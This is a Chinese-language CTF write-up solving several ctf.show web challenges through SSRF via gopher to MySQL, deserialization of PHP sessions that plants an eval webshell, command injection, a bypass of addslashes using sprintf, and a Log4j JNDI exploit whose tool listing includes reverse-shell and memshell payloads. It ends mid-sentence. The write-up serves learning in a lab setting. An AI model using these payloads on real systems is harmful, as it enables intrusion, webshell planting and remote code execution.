<h2 id="红包题第九弹"><a href="#红包题第九弹" class="headerlink" title="红包题第九弹"></a>红包题第九弹</h2><p>登陆发现除了传username之外还有个returl参数，把returl的值改为<a href="http://baidu.com直接回显了百度的页面,可能是ssrf/">http://baidu.com直接回显了百度的页面，可能是ssrf</a></p>
<p>猜测是使用了include远程包含或者curl函数，题目给了hint是跟mysql有关，那就大概是curl</p>
<p>curl也没法用file函数，换用gopher，hint给出mysql无密码，端口3306</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>

<p>往本地写文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311252255078.png" alt="image-20231125225547960"></p>
<p>把payload urlencode一下传进去成功写入tt.php文件中了，蚁剑直接打就行</p>
<h2 id="红包题-葵花宝典"><a href="#红包题-葵花宝典" class="headerlink" title="红包题 葵花宝典"></a>红包题 葵花宝典</h2><p>本来以为考的是PDO的sql注入，但是用的不是gbk，没法宽字节</p>
<p>注册+登陆就出flag</p>
<h2 id="红包题-辟邪剑谱"><a href="#红包题-辟邪剑谱" class="headerlink" title="红包题 辟邪剑谱"></a>红包题 辟邪剑谱</h2><p>mysql有个特性，当模式设置为<strong>非严格</strong>的时候，如果插入的值比列设置的值长，会自动截取一部分</p>
<p>比如插入admin+空格x300，如果列设置的是VARCHAR(255)，mysql会自动截取到合适的位置&#x3D;&gt;admin</p>
<p>login.php写死了查询的用户为admin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$data=$db-&gt;select(&quot;admin&quot;,[&quot;username&quot;,&quot;password&quot;],[&quot;username[=]&quot;=&gt;&quot;admin&quot;]);</span><br><span class="line">foreach($data as $d)&#123;</span><br><span class="line">	</span><br><span class="line">	if ($d[&#x27;password&#x27;]===$user_password)&#123;</span><br><span class="line">		$_SESSION[&#x27;user&#x27;]=$user_name;</span><br><span class="line">		die(&quot;login success!&lt;br&gt;&lt;hr&gt;flag is $flag&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只能通过注册来覆盖这个原来的admin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user_name=trim($_POST[&#x27;user_name&#x27;]);</span><br><span class="line">$user_password=trim($_POST[&#x27;user_password&#x27;]);</span><br><span class="line">$data=$db-&gt;select(&quot;admin&quot;,[&quot;username&quot;,&quot;password&quot;],[&quot;username[=]&quot;=&gt;$user_name]);</span><br><span class="line">if(count($data)&gt;0)&#123;</span><br><span class="line">	die(&quot;username in use!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($user_name===&quot;admin&quot;)&#123;</span><br><span class="line">	die(&quot;you are not admin!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\[|\&#125;|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\?/i&quot;,$user_name))&#123;</span><br><span class="line">	die(&quot;stop hack!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$data = $db-&gt;insert(&#x27;admin&#x27;,[&quot;username&quot;=&gt;&quot;$user_name&quot;,&quot;password&quot;=&gt;&quot;$user_password&quot;]);</span><br></pre></td></tr></table></figure>

<p>由于trim函数的处理，所有开头&#x2F;结尾的特殊符号都会被删去，所以只能构造admin+空格x300+1来打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_name=admin                                                                                                                                                                                                                                                                         1&amp;user_password=1</span><br></pre></td></tr></table></figure>

<p>成功注册然后登陆</p>
<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h2><p>&gt;nl</p>
<h2 id="一切看起来都那么合情合理"><a href="#一切看起来都那么合情合理" class="headerlink" title="一切看起来都那么合情合理"></a>一切看起来都那么合情合理</h2><p>session的反序列化攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br></pre></td></tr></table></figure>

<p>在这里的时候会进行一次反序列化</p>
<p>然后再了解一下序列化处理器</p>
<blockquote>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p>上述三种处理器中，<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271344073.png" alt="image-20231127134447028"></p>
<p>结果为<code>session|s:4:&quot;test&quot;;</code></p>
<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;sessionsessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;sessionsessionsessionsessionsessionsession&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271347803.png" alt="image-20231127134749768"></p>
<p>结果为<code>*sessionsessionsessionsessionsessionsessions:4:&quot;test&quot;;</code></p>
<p><code>*</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessionsession</code>为键名，<code>s:4:&quot;test&quot;;</code>为传入 GET 参数经过序列化后的值</p>
<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;var_dump(sys_get_temp_dir());</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">&gt;session_save_path(&quot;D:\\server\\tmp&quot;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271350286.png" alt="image-20231127135048253"></p>
<p>结果为<code>a:1:&#123;s:7:&quot;session&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>单纯的反序列化</p>
<p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p>
</blockquote>
<p>但指定解析器为php时，可以人为添加一个<code>|</code>，然后跟需要反序列化的内容。从而指定序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一眼写文件，指定<code>username=test.php</code>和<code>password=&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code>，然后把序列化出来的内容加个<code>|</code>然后base64传入就行</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:8:&quot;test.php&quot;;s:8:&quot;password&quot;;s:30:&quot;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br><span class="line">base64:</span><br><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo4OiJ0ZXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMDoiPD9waHAgZXZhbCgkX1BPU1RbInNoZWxsIl0pOz8+IjtzOjY6InN0YXR1cyI7Tjt9</span><br><span class="line">urlencode:</span><br><span class="line">%66%45%38%36%4e%44%6f%69%56%58%4e%6c%63%69%49%36%4d%7a%70%37%63%7a%6f%34%4f%69%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%37%63%7a%6f%34%4f%69%4a%30%5a%58%4e%30%4c%6e%42%6f%63%43%49%37%63%7a%6f%34%4f%69%4a%77%59%58%4e%7a%64%32%39%79%5a%43%49%37%63%7a%6f%7a%4d%44%6f%69%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%49%6e%4e%6f%5a%57%78%73%49%6c%30%70%4f%7a%38%2b%49%6a%74%7a%4f%6a%59%36%49%6e%4e%30%59%58%52%31%63%79%49%37%54%6a%74%39</span><br></pre></td></tr></table></figure>

<p>先访问index.php，在服务器上存个session，然后带着修改后的payload再访问index.php</p>
<p>此时会进入这层判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>从而把可控的$_cookie[‘limit’]写入session文件中，再访问&#x2F;inc&#x2F;inc.php进行反序列化，成功写入文件log-test.php</p>
<p>蚁剑直接连就行</p>
<h2 id="红包题-耗子尾汁"><a href="#红包题-耗子尾汁" class="headerlink" title="红包题 耗子尾汁"></a>红包题 耗子尾汁</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">function CTFSHOW_36_D($a,$b)&#123;</span><br><span class="line">    $dis = array(&quot;var_dump&quot;,&quot;exec&quot;,&quot;readfile&quot;,&quot;highlight_file&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;,&quot;&quot;);</span><br><span class="line">    $a = strtolower($a);</span><br><span class="line">    if (!in_array($a,$dis,true)) &#123;</span><br><span class="line">        forward_static_call_array($a,$b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">CTFSHOW_36_D($a,$b);</span><br><span class="line">echo &quot;rlezphp!!!&quot;;</span><br></pre></td></tr></table></figure>

<p>主要的重点就是通过forward_static_call_array的回调函数来调用函数，但是forward_static_call_array仅能使用静态的函数，所以eval，include这类函数就没法用</p>
<p>两种解法</p>
<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>寻找一个没在黑名单内的回调函数，通过forward_static_call_array调用这个回调函数，再调用真正的恶意函数</p>
<p>参考-&gt;<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<p>奇特的是，黑名单内没有本身这个forward_static_call_array，而且register_shutdown_function也打成了registregister_shutdown_function，所以可以任选一个函数来打</p>
<p>要求回调的第二个参数时array，所以可以构造这样一个链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forward_static_call_array-&gt;forward_static_call_array-&gt;system-&gt;&#x27;ls&#x27;</span><br></pre></td></tr></table></figure>

<p>其中forward_static_call_array为$a，system-&gt;’ls’为$b，且$b为array</p>
<blockquote>
<h3 id="说明-¶"><a href="#说明-¶" class="headerlink" title="说明 ¶"></a>说明<a href="https://www.php.net/manual/zh/function.forward-static-call-array.php#refsect1-function.forward-static-call-array-description"> ¶</a></h3><p>forward_static_call_array(<a href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> $callback, array $args): <a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a></p>
<p>通过 <code>callback</code> 参数指定调用用户定义的函数或者方法。此函数必须在方法上下文中调用，不能在类外使用。它使用<a href="https://www.php.net/manual/zh/language.oop5.late-static-bindings.php">后期静态绑定</a>。转发方法的所有参数都作为值和数组传递，类似于 <a href="https://www.php.net/manual/zh/function.call-user-func-array.php">call_user_func_array()</a>。</p>
<table>
<thead>
<tr>
<th>注意 forward_static_call_array() 的参数不是通过引用传递的。</th>
</tr>
</thead>
</table>
</blockquote>
<p>有个坑点就是这个$b为二维数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ar = array(</span><br><span class="line">        &quot;system&quot;,</span><br><span class="line">        array(&quot;ls&quot;)</span><br><span class="line">);</span><br><span class="line">=&gt;array(2) &#123; [0]=&gt; string(6) &quot;system&quot; [1]=&gt; array(1) &#123; [0]=&gt; string(2) &quot;ls&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>其中array[0]作为套娃中forward_static_call_array的第一个参数，指定了使用的静态函数名。array[1]作为forward_static_call_array的第二个参数，作为array传入静态函数中</p>
<p>所以payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=forward_static_call_array&amp;b[]=system&amp;b[][]=ls</span><br></pre></td></tr></table></figure>

<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><blockquote>
<p>在php当中默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
<p>注意访问任意全局类、函数或常量，都可以使用完全限定名称，例如 \strlen() 或 \Exception 或 \INI_ALL。</p>
<p>在命名空间内部访问全局类、函数和常量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;namespace Foo;</span><br><span class="line"></span><br><span class="line">&gt;function strlen() &#123;&#125;</span><br><span class="line">&gt;const INI_ALL = 3;</span><br><span class="line">&gt;class Exception &#123;&#125;</span><br><span class="line"></span><br><span class="line">&gt;$a = \strlen(&#x27;hi&#x27;); // 调用全局函数strlen</span><br><span class="line">&gt;$b = \INI_ALL; // 访问全局常量 INI_ALL</span><br><span class="line">&gt;$c = new \Exception(&#x27;error&#x27;); // 实例化全局类 Exception</span><br><span class="line">&gt;?&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>先要引入一个命名空间的了解，在php中默认的命名空间是\，如果不事先写，所有函数都在全局空间中使用，这就有可能造成函数名冲突</p>
<p>所以不难想到直接使用绝对路径调用system函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=\system&amp;b[]=cat flag.php</span><br></pre></td></tr></table></figure>

<h2 id="新年好"><a href="#新年好" class="headerlink" title="新年好?"></a>新年好?</h2><p>js题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/flag&#x27;, function (req, res) &#123;</span><br><span class="line">    function getflag(flag) &#123;</span><br><span class="line">      res.send(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    let delay = 10 * 1000;</span><br><span class="line">    if (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(getflag, delay,flag);</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      try &#123;</span><br><span class="line">        res.send(&#x27;Timeout!&#x27;);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>先定义了一个delay变量为10s，然后再和req.query.delay，传入的参数delay取更大的数</p>
<p>然后用delay作为设置超时的函数，这一眼就是溢出，直接把delay往大了填</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?delay=99999999999999999999</span><br></pre></td></tr></table></figure>



<h2 id="红包一"><a href="#红包一" class="headerlink" title="红包一"></a>红包一</h2><p>F12</p>
<h2 id="Log4j复现"><a href="#Log4j复现" class="headerlink" title="Log4j复现"></a>Log4j复现</h2><p>最难复现的一集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 89.117.226.223 -p 8888 -l 1234</span><br></pre></td></tr></table></figure>

<p>起一个log4j exp服务，然后用这个服务里的Basic&#x2F;TomcatEcho，在访问头里加个cmd:ls能直接打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Supported LADP Queries</span><br><span class="line">* all words are case INSENSITIVE when send to ldap server</span><br><span class="line"></span><br><span class="line">[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/JettyMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/JBossMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WebsphereMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells</span><br><span class="line"></span><br><span class="line">[+] TomcatBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] GroovyBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line"></span><br><span class="line">[+] WebsphereBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</span><br></pre></td></tr></table></figure>

<p>难复现的一b，傻逼东西</p>
<h2 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h2><p>dirb扫出.git泄露，直接githack抓下来个hint.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass=sprintf(&quot;and pass=&#x27;%s&#x27;&quot;,addslashes($_GET[&#x27;pass&#x27;]));</span><br><span class="line">$sql=sprintf(&quot;select * from user where name=&#x27;%s&#x27; $pass&quot;,addslashes($_GET[&#x27;name&#x27;]));</span><br></pre></td></tr></table></figure>

<p>主要的问题出现在$sql中，使用了第二次sprintf操作，而且$pass的值相对可控</p>
<p>sprintf用于把格式化的字符串写入一个变量中</p>
<p>而用于接收的字符格式值固定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%% -&gt; 返回一个百分号 %，%b -&gt; 二进制数，%s -&gt; 字符串</span><br><span class="line">等</span><br></pre></td></tr></table></figure>

<p>当%后所指定的类型是无法识别占位符类型时，sprintf会将其置空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;this_is_%&#x27;&quot;-&gt;sprintf处理，由于%&#x27;不被识别，置空-&gt;&quot;this_is_&quot;</span><br></pre></td></tr></table></figure>

<p>所以利用这个特性进行绕过addslashes</p>
<p>第一次addslashes+sprintf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&#x27;pass&#x27;]=test%1$&#x27;#</span><br><span class="line">$pass=&quot;and pass=test%1$\&#x27;#&quot;</span><br></pre></td></tr></table></figure>

<p>第二次addslashes+sprintf，$pass直接被拼接进去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user where name=&#x27;%s&#x27; and pass=&#x27;test%1$\&#x27;#&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>就在这个时候，对$sql进行sprintf处理，%1$\被置空，留下来的就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where name=&#x27;%s&#x27; and pass=&#x27;test&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>成功闭合</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=1&amp;pass=%1$&#x27; or 1=1%23</span><br></pre></td></tr></table></figure>

<p>进去第二步明显发现页面不对，看一眼流量，注意到cookie有file字段，CyberChef直接打出来是string转16进制，读&#x2F;flag文件就行</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">        system(&quot;curl https://&quot;.$_GET[&#x27;url&#x27;].&quot;.ctf.show&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=baidu.com%26%26cat%20flag%26%26</span><br></pre></td></tr></table></figure>

<h2 id="假赛生"><a href="#假赛生" class="headerlink" title="假赛生"></a>假赛生</h2><p>就是各种利用空格</p>
<p>提示register.php和login.php，还给了index源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">if(empty($_SESSION[&#x27;name&#x27;]))&#123;</span><br><span class="line">    show_source(&quot;index.php&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $name=$_SESSION[&#x27;name&#x27;];</span><br><span class="line">    $sql=&#x27;select pass from user where name=&quot;&#x27;.$name.&#x27;&quot;&#x27;;</span><br><span class="line">    echo $sql.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    system(&#x27;4rfvbgt56yhn.sh&#x27;);</span><br><span class="line">    $query=mysqli_query($conn,$sql);</span><br><span class="line">    $result=mysqli_fetch_assoc($query);</span><br><span class="line">    if($name===&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">        if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">            preg_replace_callback(&quot;/\w\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);</span><br><span class="line">            echo $flag;</span><br></pre></td></tr></table></figure>

<p>看起来没有能session反序列化的地方，register尝试注册admin不允许</p>
<p>但是在sql中，空格的操作还挺有意思</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `admininfo` where realname = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>这个时候如果表中有名为”admin “的数据（带了个空格），也是能被一起查询出来的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312061210488.png" alt="image-20231206121034404"></p>
<p>注册的时候传入的”admin”和”admin “又是两个不同的字符串，所以直接注册”admin “，登陆”admin”就行</p>
<p>第二步就是绕过判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace_callback(&quot;/\w\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);</span><br></pre></td></tr></table></figure>

<p>直接fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import regex</span><br><span class="line"></span><br><span class="line">fuzz = string.printable</span><br><span class="line">for i in fuzz:</span><br><span class="line">    if not regex.match(r&quot;\w\W*&quot;, i):</span><br><span class="line">        print(i, end = &quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>打出来的结果是</p>
